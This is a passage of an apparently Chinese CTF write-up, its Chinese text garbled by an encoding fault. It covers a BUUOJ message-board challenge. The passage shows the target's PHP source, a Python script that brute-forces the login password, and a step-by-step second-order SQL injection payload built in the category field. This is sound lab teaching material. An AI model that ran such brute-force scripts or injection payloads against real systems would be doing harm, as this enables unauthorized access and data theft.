invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="ç™»å½•ç³»ç»Ÿ"><a href="#ç™»å½•ç³»ç»Ÿ" class="headerlink" title="ç™»å½•ç³»ç»Ÿ:"></a>ç™»å½•ç³»ç»Ÿ:</h2><p><img src="/images/2024-2-18/image-20240208150050832.png" alt="image-20240208150050832"></p><p>ç”±äºæˆ‘ä»¬åœ¨å¯¹æ•°æ®åº“çš„æ“ä½œä¹‹å‰å¿…é¡»è¦å…ˆç™»å½•ç³»ç»Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå°è¯•ç™»å½•å®ƒï¼Œæ ¹æ®ç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬å‘ç°ç”¨æˆ·åæ¡†æ˜¾ç¤ºzhangwei,å¯†ç æ¡†æ˜¾ç¤ºzhangwei***ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯è´¦æˆ·çš„è¾“å…¥æ ¼å¼ï¼Œä½†æ˜¯çœ‹äº†å¤§ä½¬çš„wpçŸ¥é“è¿™æ˜¯ä½œè€…ç»™çš„æç¤ºï¼Œè´¦æˆ·åæ˜¯zhangwei,å¯†ç æ˜¯zhangwei***,***æ˜¯è¢«ä¿å¯†çš„å†…å®¹ï¼Œå¯èƒ½ä¸ºä¸‰ä¸ªæ•°å­—ï¼Œæˆ–è€…ä¸‰ä¸ªå­—æ¯ç­‰æƒ…å†µï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬å»çˆ†ç ´</p><h3 id="çŒœæµ‹-æ˜¯æ•°å­—ï¼š"><a href="#çŒœæµ‹-æ˜¯æ•°å­—ï¼š" class="headerlink" title="çŒœæµ‹***æ˜¯æ•°å­—ï¼š"></a>çŒœæµ‹***æ˜¯æ•°å­—ï¼š</h3><h4 id="å¯†ç çˆ†ç ´è„šæœ¬"><a href="#å¯†ç çˆ†ç ´è„šæœ¬" class="headerlink" title="å¯†ç çˆ†ç ´è„šæœ¬:"></a>å¯†ç çˆ†ç ´è„šæœ¬:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&quot;http://4d72a730-6e40-40d9-871b-ebf645b86e7c.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># å°†æ•°å­—çš„é•¿åº¦è¡¥æˆé•¿åº¦ä¸º3çš„å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">num</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">3</span>-<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(num))))+<span class="hljs-built_in">str</span>(num)<br><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">333</span>,<span class="hljs-number">1000</span>):<br>    passwd = change(num)<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;zhangwei&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;zhangwei&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd)<br>    &#125;<br>    resp = res.post(url=url, data=data)<br>    <span class="hljs-comment"># ç”¨å“åº”æ•°æ®åŒ…çš„é•¿åº¦æ¥åˆ¤æ–­æ­£ç¡®å¯†ç </span><br>    <span class="hljs-comment"># è®¾ç½®ç™»å½•å¤±è´¥çš„é•¿åº¦ï¼Œå¯ä»¥å…ˆæ³¨é‡Šè¯¥ä»£ç æŸ¥çœ‹å¤±è´¥çš„æ•°æ®åŒ…é•¿åº¦ï¼Œå†å¯ç”¨</span><br>    fail_len = <span class="hljs-number">1722</span><br>    <span class="hljs-built_in">print</span>(passwd + <span class="hljs-string">&#x27;=&gt;&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(resp.text)))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(resp.text)!=fail_len):<br>        <span class="hljs-keyword">break</span><br>    <br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208163528399.png" alt="image-20240208163528399"></p><p>æœ€ç»ˆå¾—åˆ°666æ‰€ååº”å¾—æ•°æ®åŒ…é•¿åº¦ä¸åŒï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯***</p><p><img src="/images/2024-2-18/image-20240208163455987.png" alt="image-20240208163455987"></p><p>æˆåŠŸç™»å½•ï¼ï¼ï¼</p><h2 id="éšä¾¿å‘ä¸€ä¸ªè´´ï¼š"><a href="#éšä¾¿å‘ä¸€ä¸ªè´´ï¼š" class="headerlink" title="éšä¾¿å‘ä¸€ä¸ªè´´ï¼š"></a>éšä¾¿å‘ä¸€ä¸ªè´´ï¼š</h2><p><img src="/images/2024-2-18/image-20240208163808384.png" alt="image-20240208163808384"></p><h3 id="ç‚¹å‡»è¯¦æƒ…æŸ¥çœ‹ä¸€ä¸‹ï¼š"><a href="#ç‚¹å‡»è¯¦æƒ…æŸ¥çœ‹ä¸€ä¸‹ï¼š" class="headerlink" title="ç‚¹å‡»è¯¦æƒ…æŸ¥çœ‹ä¸€ä¸‹ï¼š"></a>ç‚¹å‡»è¯¦æƒ…æŸ¥çœ‹ä¸€ä¸‹ï¼š</h3><p><img src="/images/2024-2-18/image-20240208164903572.png" alt="image-20240208164903572"></p><h3 id="æäº¤ä¸€ä¸‹æˆ‘ä»¬å¾—ç•™è¨€"><a href="#æäº¤ä¸€ä¸‹æˆ‘ä»¬å¾—ç•™è¨€" class="headerlink" title="æäº¤ä¸€ä¸‹æˆ‘ä»¬å¾—ç•™è¨€:"></a>æäº¤ä¸€ä¸‹æˆ‘ä»¬å¾—ç•™è¨€:</h3><p><img src="/images/2024-2-18/image-20240208164920824.png" alt="image-20240208164920824"></p><p><img src="/images/2024-2-18/image-20240208164947387.png" alt="image-20240208164947387"></p><p>å‘ç°æˆ‘ä»¬çš„ç•™è¨€è¢«æ˜¾ç¤ºå‡ºæ¥äº†ã€‚</p><h3 id="æ ¹æ®ä¸šåŠ¡é‡æ–°ä»£ç å®¡è®¡"><a href="#æ ¹æ®ä¸šåŠ¡é‡æ–°ä»£ç å®¡è®¡" class="headerlink" title="æ ¹æ®ä¸šåŠ¡é‡æ–°ä»£ç å®¡è®¡:"></a>æ ¹æ®ä¸šåŠ¡é‡æ–°ä»£ç å®¡è®¡:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-comment">// ä¸ºpostè·å–çš„categoryä¸­çš„å­—ç¬¦ä¸²çš„ç‰¹æ®Šå­—ç¬¦æ·»åŠ è½¬ä¹‰\,ä½¿å¾—å­—ç¬¦ä¸²å†…å®¹åœ¨sqlè¯­å¥ä¸­ä¸ä¼šæœ‰ä¸€äº›å±é™©æ“ä½œï¼Œå³ä½¿å­—ç¬¦ä¸²ä¸­çš„å†…å®¹åªä½œä¸ºsqlè¯­å¥ä¸­çš„å†…å®¹</span><br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<span class="hljs-comment"># æ­£æ–‡å†…å®¹</span><br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<span class="hljs-comment"># æ ‡é¢˜</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<span class="hljs-comment"># ç•™è¨€å†…å®¹</span><br>    <span class="hljs-comment">// æ’å…¥è¯­å¥çš„å®šä¹‰</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-comment">// æ‰§è¡Œsqlè¯­å¥ï¼Œè¿”å›ç»“æœé›†æˆ–å¸ƒå°”å€¼</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-comment">// æƒ³è¦æŸ¥çœ‹å¾—ç•™è¨€è®°å½•å¾—id(ç‚¹å‡»è¯¦æƒ…)</span><br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-comment">// æ‰§è¡Œsqlè¯­å¥</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-comment">// è·å–ç»“æœé›†çš„è®°å½•æ•°é‡</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// è·å–ç»“æœé›†ä¸­categoryå­—æ®µçš„å€¼</span><br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-comment">// è·å–contentå†…å®¹ï¼Œè·å–ç•™è¨€å†…å®¹</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-comment">// å°†å†…å®¹æ’å…¥sqlè¯­å¥</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¿™é‡Œçš„æ­£æ–‡å’Œç•™è¨€å†…å®¹ä»¥åŠtitleéƒ½å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„å†…å®¹ï¼Œè¿™äº›å†…å®¹å…¨éƒ¨æ˜¯ä»æ•°æ®åº“ä¸­æŸ¥æ‰¾å‡ºæ¥çš„ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ˜¯æˆ‘ä»¬å¯¹æ•°æ®åº“çš„æ”»å‡»ä¿¡æ¯ï¼Œé‚£æ˜¯ä¸æ˜¯æœ‰å¯èƒ½ä¼šå°†æ•°æ®åº“ä¿¡æ¯æ˜¾ç¤ºåˆ°ç½‘é¡µä¸Šã€‚<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ï¼ˆmysqlçš„äºŒæ¬¡æ³¨å…¥ï¼‰"><a href="#åˆ©ç”¨ï¼ˆmysqlçš„äºŒæ¬¡æ³¨å…¥ï¼‰" class="headerlink" title="åˆ©ç”¨ï¼ˆmysqlçš„äºŒæ¬¡æ³¨å…¥ï¼‰:"></a>åˆ©ç”¨ï¼ˆmysqlçš„äºŒæ¬¡æ³¨å…¥ï¼‰:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysqlçš„äºŒæ¬¡æ³¨å…¥æ”»å‡»æ˜¯åˆ©ç”¨insertè¯­å¥ä¸å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤æ£€æŸ¥ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ’å…¥æ•°æ®åº“ä¸­åï¼Œåœ¨é¡µé¢ä¸Šåˆé€šè¿‡selectè¯­å¥å°†æ•°æ®åº“å†…å®¹æ˜¾ç¤ºåˆ°ç½‘é¡µä¸Šï¼Œä»è€Œè®©æ”»å‡»è€…è·å–å†…éƒ¨ä¿¡æ¯çš„æ”»å‡»æ–¹å¼ã€‚<br>è¿™é‡Œæœ‰ä¸‰ä¸ªæ³¨å…¥ç‚¹å¯ä»¥è¿›è¡Œinsertæ’å…¥:category,title,content<br><br>åŒæ—¶è¿™ä¸‰ä¸ªæ³¨å…¥ç‚¹çš„å†…å®¹å…¨éƒ¨éƒ½ä¼šè¢«æ˜¾ç¤ºåˆ°comment.phpé¡µé¢ä¸Šï¼Œæ‰€ä»¥ç†è®ºä¸Šè¿™ä¸‰ä¸ªæ³¨å…¥ç‚¹éƒ½å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬å†™å…¥çš„æ”»å‡»sqlè¯­å¥æ˜¯è¦è¢«æ•°æ®åº“æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä¸èƒ½è¢«&#x27;&#x27;æˆ–&quot;&quot;åŒ…è£¹ï¼Œæ‰€ä»¥æœ€å¥½çš„æ–¹å¼æ˜¯ç›´æ¥å†™å…¥sqlè¯­å¥ä¸­ï¼Œæ‰€ä»¥ä¼šé€‰æ‹©insertè¯­å¥ä¸­çš„éæœ€åä¸€ä¸ªå‚æ•°ç‚¹è¿›è¡Œå†™å…¥å±é™©ä»£ç ï¼Œä½†æ˜¯ç”±äºè¿™ä¸‰ä¸ªå‚æ•°åœ¨writeé¡µé¢ä¸Šéƒ½ä¼šå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²åšåŠ \çš„å¤„ç†ï¼Œæ‰€ä»¥åœ¨writeé¡µé¢ä»¥åŠcommentç•Œé¢ä¼ å±é™©ä»£ç è¿›å…¥æ•°æ®åº“éƒ½ä¸ä¼šè¢«æ‰§è¡Œï¼Œä¼šè¢«å½“åšå­—ç¬¦ä¸²å­˜å…¥æ•°æ®åº“<br><br>\å­—ç¬¦åœ¨è¢«å­˜å…¥æ•°æ®åº“çš„è¿‡ç¨‹ä¸­ä¼šè¢«è‡ªåŠ¨å»é™¤ï¼Œæ‰€ä»¥å†å–å‡ºæ¥çš„å­—ç¬¦ä¸²å°±æ˜¯ä¸å¸¦\,è€Œå¦‚æœè¿™ä¸ªæ—¶å€™å†è¢«æ’å…¥æ•°æ®åº“ï¼Œå±é™©ä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œå†é€šè¿‡selectæŸ¥è¯¢ï¼Œå°±å¯ä»¥è·å–åˆ°æ•°æ®åº“ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><h4 id="payloadæ„é€ åˆ†æï¼š"><a href="#payloadæ„é€ åˆ†æï¼š" class="headerlink" title="payloadæ„é€ åˆ†æï¼š"></a>payloadæ„é€ åˆ†æï¼š</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs txt">æˆ‘ä»¬è¦åˆ©ç”¨æ•°æ®åº“å†…å®¹å†å–å‡ºæ¥ä¸å¸¦\çš„æ€§è´¨æ³¨å…¥å±é™©ä»£ç ï¼Œæ‰€ä»¥è¦ä»å†å–å‡ºçš„æ³¨å…¥ç‚¹è§‚å¯Ÿ:<br>$bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);<br>    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;<br>    // æ‰§è¡Œsqlè¯­å¥<br>    $result = mysql_query($sql);<br>    // è·å–ç»“æœé›†çš„è®°å½•æ•°é‡<br>    $num = mysql_num_rows($result);<br>    if($num&gt;0)&#123;<br>        // è·å–ç»“æœé›†ä¸­categoryå­—æ®µçš„å€¼<br>    $category = mysql_fetch_array($result)[&#x27;category&#x27;];<br>    // è·å–contentå†…å®¹ï¼Œè·å–ç•™è¨€å†…å®¹<br>    $content = addslashes($_POST[&#x27;content&#x27;]);<br>    // å°†å†…å®¹æ’å…¥sqlè¯­å¥<br>    $sql = &quot;insert into comment<br>            set category = &#x27;$category&#x27;,<br>                content = &#x27;$content&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br>$categoryçš„å†…å®¹å¯ä»¥ä»æ•°æ®åº“ä¸­å†å–å‡ºï¼Œæ‰€ä»¥$categoryæ˜¯å¯ä»¥åˆ©ç”¨çš„æ³¨å…¥ç‚¹,åŒæ—¶è¯¥sqlè¯­å¥ä¸­ä¼šå±•ç¤ºçš„é¡µé¢æ˜¯commenté¡µé¢ï¼Œè¯¥é¡µé¢ä¼šå±•ç¤º$categoryå’Œ$contentå†…å®¹ï¼Œæˆ‘ä»¬è®©contentä½œä¸ºä¿¡æ¯å±•ç¤ºç‚¹ã€‚<br><br>writeç•Œé¢åœ¨$categoryå‚æ•°ä¸Šè¿›è¡Œæ³¨å…¥:<br>$category = 123&#x27;,content = database(),/*<br>$title=666<br>$content=666<br>$sql = &quot;insert into board<br>            set category = &#x27;$category&#x27;,<br>                title = &#x27;$title&#x27;,<br>                content = &#x27;$content&#x27;&quot;;<br>=&gt;<br> $sql = &quot;insert into board<br>            set category = &#x27;123\&#x27;,content=database(),/*&#x27;,<br>                title = &#x27;666&#x27;,<br>                content = &#x27;666&#x27;&quot;;<br> =&gt;<br>æ‰§è¡Œçš„sqlè¯­å¥å°±æ˜¯ï¼š<br>insert into board<br>            set category = &#x27;123\&#x27;,content=database(),/*&#x27;,<br>                title = &#x27;666&#x27;,<br>                content = &#x27;666&#x27;<br>123\&#x27;,content=database();/*è¢«æ’å…¥categoryå­—æ®µä¸­<br><br>commentç•Œé¢é‡æ–°å‘è¡¨ç•™è¨€:<br>$category=mysql_fetch_array($result)[&#x27;category&#x27;];=123&#x27;,content=database(),/*è¢«æ’å…¥category<br>//è¢«é‡æ–°å–å‡ºæ•°æ®åº“åï¼Œç”±äºæ•°æ®åº“è‡ªåŠ¨å»é™¤\ï¼Œæ‰€ä»¥ä¸å¸¦\<br>$content=666<br>$sql = &quot;insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br>ç„¶åæ‰§è¡Œæ•´ä¸ªsqlè¯­å¥:<br>insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure><h5 id="æµ‹è¯•sqlè¯­å¥çš„æ­£ç¡®æ€§"><a href="#æµ‹è¯•sqlè¯­å¥çš„æ­£ç¡®æ€§" class="headerlink" title="æµ‹è¯•sqlè¯­å¥çš„æ­£ç¡®æ€§:"></a>æµ‹è¯•sqlè¯­å¥çš„æ­£ç¡®æ€§:</h5><p>sql:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæœ‰æ¢è¡Œçš„sqlè¯­å¥ï¼Œåœ¨phpä¸­æœ‰æ¢è¡Œï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™ä¹Ÿä»¥æ¢è¡Œçš„å½¢å¼æ‰§è¡Œ,ç”±äºæˆ‘ä»¬éœ€è¦æ’å…¥bo_idçš„å†…å®¹ï¼Œä¸ç„¶æ•´ä¸ªé€»è¾‘ä¼šæœ‰é”™è¯¯ï¼Œæ‰€ä»¥contentéœ€è¦ä¸º*&#x2F;#</p><p>(&#x2F;* *&#x2F;ä¹Ÿä¸ºsqlä¸­çš„å¤šè¡Œæ³¨é‡Šï¼Œ#ä¸ºæ³¨é‡Šåé¢å†…å®¹åªæœ‰#æ‰€åœ¨è¡Œ)</p><p>sql2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;*/#&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br>&lt;=&gt;<br>insert into comment<br>            set category = &#x27;123&#x27;,content=database(),<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ³¨é‡Šæ‰contentï¼ŒåŒæ—¶ä¿ç•™bo_id</p><h4 id="æŠ“å–writeçš„ç•Œé¢ï¼š"><a href="#æŠ“å–writeçš„ç•Œé¢ï¼š" class="headerlink" title="æŠ“å–writeçš„ç•Œé¢ï¼š"></a>æŠ“å–writeçš„ç•Œé¢ï¼š</h4><p><img src="/images/2024-2-18/image-20240208195316538.png" alt="image-20240208195316538"></p><h4 id="è·å–æ•°æ®åº“ä¿¡æ¯"><a href="#è·å–æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="è·å–æ•°æ®åº“ä¿¡æ¯:"></a>è·å–æ•°æ®åº“ä¿¡æ¯:</h4><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=database(),/*&amp;content=666<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208204121356.png" alt="image-20240208204121356"></p><p><img src="/images/2024-2-18/image-20240208204155277.png" alt="image-20240208204155277"></p><h5 id="æŸ¥çœ‹è¿™æ¡æ–°æ’å…¥çš„è®°å½•"><a href="#æŸ¥çœ‹è¿™æ¡æ–°æ’å…¥çš„è®°å½•" class="headerlink" title="æŸ¥çœ‹è¿™æ¡æ–°æ’å…¥çš„è®°å½•:"></a>æŸ¥çœ‹è¿™æ¡æ–°æ’å…¥çš„è®°å½•:</h5><p><img src="/images/2024-2-18/image-20240208204226712.png" 